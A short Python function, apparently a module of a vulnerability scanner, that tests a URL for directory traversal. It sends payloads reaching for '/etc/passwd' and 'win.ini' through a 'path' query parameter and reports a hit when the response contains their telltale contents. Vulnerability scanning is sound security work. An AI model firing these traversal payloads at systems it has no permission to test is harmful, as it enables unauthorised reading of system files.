import requests

def check(url):
    print(f"Testing Directory Traversal on {url}")
    payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
    for payload in payloads:
        traversal_url = f"{url}?path={payload}"
        try:
            response = requests.get(traversal_url)
            if "root:" in response.text or "[extensions]" in response.text:
                print(f"Possible Directory Traversal vulnerability found at {traversal_url}")
        except requests.RequestException as e:
            print(f"Error testing Directory Traversal on {url}: {e}")
